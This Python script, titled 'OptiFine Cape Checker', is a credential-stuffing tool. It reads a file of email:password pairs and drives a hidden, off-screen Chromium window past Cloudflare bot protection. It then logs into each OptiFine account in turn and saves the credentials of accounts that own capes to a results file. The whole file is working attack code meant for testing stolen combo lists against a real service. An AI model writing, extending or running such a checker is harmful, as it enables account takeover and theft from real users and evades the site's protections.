from DrissionPage import ChromiumPage, ChromiumOptions
import time
import os
from CloudflareBypasser import CloudflareBypasser
from colorama import Fore, Back, Style, init
from tqdm import tqdm

# Initialize colorama
init(autoreset=True)

# Terminal color constants
class Colors:
    TITLE = Fore.CYAN + Style.BRIGHT
    SUCCESS = Fore.GREEN + Style.BRIGHT
    ERROR = Fore.RED
    WARNING = Fore.YELLOW
    INFO = Fore.BLUE
    RESET = Style.RESET_ALL
    HEADER = Fore.MAGENTA + Style.BRIGHT
    PROGRESS = Fore.WHITE + Style.BRIGHT
    HIGHLIGHT = Fore.CYAN
    SEPARATOR = Fore.WHITE + Style.DIM


class InvalidCredentialsException(Exception):
    """Exception raised when invalid credentials are detected."""
    pass


class OptifineLoginHandler:
    """A class to handle OptiFine login."""
    
    def __init__(self, timeout=10):
        """Initialize the OptiFine login handler."""
        self.timeout = timeout
        self.driver = None
        self.cf_bypasser = None
        self.has_cape = False
    
    def _get_browser_path(self):
        """Determine browser path based on OS."""
        if os.name == 'nt':  # Windows
            return os.getenv('CHROME_PATH', r"C:/Program Files/Google/Chrome/Application/chrome.exe")
        else:  # macOS/Linux
            return os.getenv('CHROME_PATH', "/usr/bin/google-chrome")
    
    def _configure_browser(self):
        """Configure and initialize the browser with optimized settings."""
        browser_path = self._get_browser_path()
        options = ChromiumOptions().auto_port()
        
        if browser_path:
            options.set_paths(browser_path=browser_path)
        
        # Core arguments for performance and hiding
        arguments = [
            "--disable-extensions",
            "--disable-gpu",
            "--disable-dev-shm-usage",
            "--no-default-browser-check",
            "--disable-background-networking",
            "--disable-sync",
            "--window-size=1,1",  # Set to extremely small size (effectively hidden)
            "--window-position=0,0",  # Position at top-left
            "--mute-audio",
            "--js-flags=--max_old_space_size=128",
        ]
        
        for argument in arguments:
            options.set_argument(argument)
        
        self.driver = ChromiumPage(addr_or_opts=options)
        
        # Use JavaScript to minimize the window after it's created
        self.driver.run_js("""
        try {
            window.moveTo(-9999, -9999);  // Move window off-screen
            window.resizeTo(1, 1);  // Resize to minimum
        } catch(e) {
            // Ignore errors
        }
        """)
    
    def _handle_cloudflare(self):
        """Handle Cloudflare protection bypass."""
        if not self.cf_bypasser:
            self.cf_bypasser = CloudflareBypasser(self.driver, log=False)
        
        if not self.cf_bypasser.is_bypassed():
            self.cf_bypasser.bypass()
            return self.cf_bypasser.is_bypassed()
                
        return True
    
    def _check_for_invalid_credentials(self):
        """Check if the page shows invalid credentials error message."""
        try:
            script = """
            try {
                const pageText = document.body.innerText;
                if (pageText.includes('Invalid username or password') || 
                    pageText.includes('Please login with your donation email')) {
                    return document.body.innerText.match(/(Invalid username or password|Please login with your donation email)[^.]*\.?/)[0];
                }
                return false;
            } catch(e) {
                return false;
            }
            """
            error_msg = self.driver.run_js(script)
            
            if error_msg:
                raise InvalidCredentialsException(error_msg)
                
            return False
        except InvalidCredentialsException:
            raise
        except Exception:
            return False
    
    def check_for_capes(self):
        """Check if the user has any capes available."""
        try:
            # Navigate to the donations page if not already there
            if "donations" not in self.driver.url:
                self.driver.get("https://optifine.net/donations")
                
                # Wait for page to load with a timeout
                start_time = time.time()
                while time.time() - start_time < 3:  # 3 second timeout
                    if "donations" in self.driver.url:
                        break
                    time.sleep(0.2)
            
            # Check for cape indicators using JavaScript
            script = """
            try {
                const html = document.documentElement.innerHTML;
                return html.includes('Capes') && (html.includes('Cape ID') || html.includes('Activated'));
            } catch(e) {
                return false;
            }
            """
            return self.driver.run_js(script)
                
        except Exception:
            return False
    
    def login(self, email, password):
        """Log into OptiFine account."""
        try:
            # Initialize browser
            self._configure_browser()
            
            # Keep window hidden with JavaScript
            self.driver.run_js("""
            try {
                window.moveTo(-9999, -9999);  // Move window off-screen
                window.resizeTo(1, 1);  // Resize to minimum
            } catch(e) {
                // Ignore errors
            }
            """)
            
            # Navigate to the login page with a fresh session
            self.driver.clear_cache()
            self.driver.get("https://optifine.net/login")
            
            # Handle initial Cloudflare protection
            cloudflare_start = time.time()
            while time.time() - cloudflare_start < 7:  # 7 second timeout for Cloudflare
                if self._handle_cloudflare():
                    break
                time.sleep(0.5)
            
            # Check if we're on the login page
            if "login" not in self.driver.url:
                return False
            
            # Wait for page to load
            time.sleep(0.3)
            
            # Check for donation email message before login
            try:
                self._check_for_invalid_credentials()
            except InvalidCredentialsException:
                raise
            
            # Use JavaScript for form filling
            script = f"""
            try {{
                let emailField = document.querySelector('input[name="email"]');
                let passwordField = document.querySelector('input[name="password"]');
                let form = document.querySelector('form');
                
                if(emailField && passwordField && form) {{
                    emailField.value = '{email}';
                    passwordField.value = '{password}';
                    form.submit();
                    return true;
                }}
                return false;
            }} catch(e) {{
                return false;
            }}
            """
            form_submitted = self.driver.run_js(script)
            
            if not form_submitted:
                # Fallback method
                donation_email_field = self.driver.ele('input[name="email"]', timeout=2)
                password_field = self.driver.ele('input[name="password"]', timeout=2)
                login_button = self.driver.ele('input[type="submit"], button[type="submit"]', timeout=2)
                
                if all([donation_email_field, password_field, login_button]):
                    donation_email_field.input(email)
                    password_field.input(password)
                    login_button.click()
                else:
                    return False
            
            # Quick check for error messages
            time.sleep(0.5)
            try:
                self._check_for_invalid_credentials()
            except InvalidCredentialsException:
                raise
            
            # Wait for page to load
            start_time = time.time()
            login_success = False
            
            while time.time() - start_time < self.timeout:
                try:
                    self._check_for_invalid_credentials()
                except InvalidCredentialsException:
                    raise
                
                if "donations" in self.driver.url:
                    login_success = True
                    break
                
                time.sleep(0.2)
            
            if not login_success:
                try:
                    self._check_for_invalid_credentials()
                except InvalidCredentialsException:
                    raise
                return False
            
            # Check for capes
            self.has_cape = self.check_for_capes()
            return True
                
        except InvalidCredentialsException:
            raise
        except Exception:
            return False
        finally:
            # The finally block should contain code, but in this case, we're handling browser closing in the main function
            pass  # Adding a 'pass' statement to properly handle the empty finally block


def process_accounts(file_path):
    """Process a batch file containing email:password combinations."""
    # Create results folder
    if not os.path.exists("results"):
        os.makedirs("results")
    
    # Output files
    with_cape_file = os.path.join("results", "with_cape.txt")
    error_file = os.path.join("results", "error_accounts.txt")
    
    # Read the batch file
    try:
        with open(file_path, 'r') as f:
            accounts = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Colors.ERROR}Error reading batch file: {e}{Colors.RESET}")
        return
    
    print(f"\n{Colors.INFO}Processing {Colors.HIGHLIGHT}{len(accounts)}{Colors.INFO} accounts from {Colors.HIGHLIGHT}{file_path}{Colors.RESET}")
    print(f"{Colors.SEPARATOR}{'=' * 50}{Colors.RESET}")
    
    # Initialize counters
    start_time_total = time.time()
    total_accounts = len(accounts)
    valid_accounts = 0
    invalid_accounts = 0
    account_times = []
    
    # Create progress bar
    progress_bar = tqdm(total=total_accounts, desc=f"{Colors.PROGRESS}Progress", 
                        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]")
    
    for account in accounts:
        account_start_time = time.time()
        login_handler = None
        
        try:
            # Parse email and password
            if ':' not in account:
                with open(error_file, 'a') as f:
                    f.write(f"{account} (Invalid format)\n")
                invalid_accounts += 1
                progress_bar.update(1)
                continue
                
            email, password = account.split(':', 1)
            
            # Create login handler and run
            login_handler = OptifineLoginHandler()
            
            try:
                success = login_handler.login(email, password)
                
                if success and login_handler.has_cape:
                    # Update progress bar description with current account
                    progress_bar.set_description(f"{Colors.HIGHLIGHT}{email}{Colors.RESET}")
                    
                    # Print success message on a new line
                    tqdm.write(f"{Colors.HIGHLIGHT}{email} - {Colors.SUCCESS}Cape available{Colors.RESET}")
                    
                    with open(with_cape_file, 'a') as f:
                        f.write(f"{account}\n")
                    valid_accounts += 1
                else:
                    reason = "No cape found" if success else "Login failed"
                    # Update progress bar description
                    progress_bar.set_description(f"{Colors.HIGHLIGHT}{email}{Colors.RESET}")
                    
                    # Print error message on a new line
                    tqdm.write(f"{Colors.HIGHLIGHT}{email} - {Colors.ERROR}{reason}{Colors.RESET}")
                    
                    with open(error_file, 'a') as f:
                        f.write(f"{account} ({reason})\n")
                    invalid_accounts += 1
                    
            except InvalidCredentialsException as e:
                error_msg = str(e)
                # Update progress bar description
                progress_bar.set_description(f"{Colors.HIGHLIGHT}{email}{Colors.RESET}")
                
                # Print error message on a new line
                tqdm.write(f"{Colors.HIGHLIGHT}{email} - {Colors.ERROR}{error_msg}{Colors.RESET}")
                
                with open(error_file, 'a') as f:
                    f.write(f"{account} ({error_msg})\n")
                invalid_accounts += 1
                
        except Exception as e:
            # Print error message on a new line
            tqdm.write(f"{Colors.ERROR}Error processing {account}: {e}{Colors.RESET}")
            
            with open(error_file, 'a') as f:
                f.write(f"{account} (Error: {str(e)})\n")
            invalid_accounts += 1
            
        finally:
            # Always close browser properly
            if login_handler and login_handler.driver:
                login_handler.driver.quit()
                
        account_time = time.time() - account_start_time
        account_times.append(account_time)
        
        # Update progress bar
        progress_bar.update(1)
    
    # Close progress bar
    progress_bar.close()
    
    # Calculate statistics
    total_time = time.time() - start_time_total
    
    print(f"\n{Colors.SEPARATOR}{'=' * 50}{Colors.RESET}")
    print(f"{Colors.HEADER}SUMMARY:{Colors.RESET}")
    print(f"{Colors.INFO}Total accounts: {Colors.HIGHLIGHT}{total_accounts}{Colors.RESET}")
    print(f"{Colors.SUCCESS}Valid accounts: {Colors.HIGHLIGHT}{valid_accounts}{Colors.RESET}")
    print(f"{Colors.ERROR}Invalid accounts: {Colors.HIGHLIGHT}{invalid_accounts}{Colors.RESET}")
    print(f"{Colors.INFO}Total time: {Colors.HIGHLIGHT}{total_time/60:.2f}{Colors.INFO} minutes{Colors.RESET}")
    
    if account_times:
        avg_time = sum(account_times) / len(account_times)
        print(f"{Colors.INFO}Average time per account: {Colors.HIGHLIGHT}{avg_time:.2f}{Colors.INFO} seconds{Colors.RESET}")
        if len(account_times) > 1:
            min_time = min(account_times)
            max_time = max(account_times)
            print(f"{Colors.INFO}Fastest check: {Colors.HIGHLIGHT}{min_time:.2f}{Colors.INFO} seconds{Colors.RESET}")
            print(f"{Colors.INFO}Slowest check: {Colors.HIGHLIGHT}{max_time:.2f}{Colors.INFO} seconds{Colors.RESET}")


def main():
    """Main function to run the script."""
    print(f"\n{Colors.SEPARATOR}{'=' * 50}{Colors.RESET}")
    print(f"{Colors.TITLE}{'OptiFine Cape Checker':^50}{Colors.RESET}")
    print(f"{Colors.SEPARATOR}{'=' * 50}{Colors.RESET}")
    
    # Get batch file path
    batch_file = input(f"{Colors.INFO}Enter path (.txt): {Colors.RESET}")
    if not os.path.exists(batch_file):
        print(f"{Colors.ERROR}File not found: {batch_file}{Colors.RESET}")
        return
        
    # Process the batch file
    process_accounts(batch_file)


if __name__ == "__main__":
    main()